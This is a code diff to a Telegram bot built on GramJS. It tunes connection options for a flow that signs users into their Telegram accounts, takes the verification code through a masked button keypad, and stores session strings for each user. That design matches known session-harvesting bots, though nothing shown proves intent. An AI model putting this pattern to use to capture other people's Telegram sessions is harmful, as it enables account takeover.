@@ -101,8 +101,11 @@ async function getClient(userId) {
     const sessionStr = await getSessionStr(userId);
     if (!sessionStr) return null;
 
+    // FIX: Configured global options to prevent timeout loops on active channels
     client = new TelegramClient(new StringSession(sessionStr), API_ID, API_HASH, { 
       connectionRetries: 5,
+      useWSS: true,
+      floodSleepThreshold: 60
     });
     await client.connect();
     activeClients.set(userId, client);
@@ -391,7 +394,16 @@ bot.on("message", async (msg) => {
   try {
     if (state.step === "PHONE") {
       const cleanPhone = msg.text.replace(/\s+/g, "");
-      const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { connectionRetries: 5 });
+      
+      // FIX: Configured setup client with update listeners disabled to eliminate the update loop timeouts
+      const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { 
+        connectionRetries: 5,
+        useWSS: true,
+        floodSleepThreshold: 60
+      });
+      
+      // Explicitly tell GramJS's update loop manager not to process stream packages during initialization
+      client._keepAlive = false; 
       await client.connect();
 
       let resolveCode, resolvePassword;
@@ -570,7 +582,6 @@ bot.on("callback_query", async (query) => {
   const userId = query.from.id;
   const isOwner = OWNER_ID && userId === OWNER_ID;
 
-  // ── Handle Pad Interface Matrix ───────────────────────────────────────────
   if (data.startsWith("num_")) {
     const state = loginStates.get(userId);
     if (!state) return bot.answerCallbackQuery(query.id, { text: "No active login sequence." });
@@ -612,11 +623,9 @@ bot.on("callback_query", async (query) => {
       return;
     }
 
-    // Append number
     state.codeBuffer += key;
     bot.answerCallbackQuery(query.id);
     
-    // Obfuscate character array display matching industry metrics
     const maskedText = "*".repeat(state.codeBuffer.length);
 
     bot.editMessageText(`📬 Click the buttons below to enter the verification code sent by Telegram:\n\nEntered: \`${maskedText}\``, {
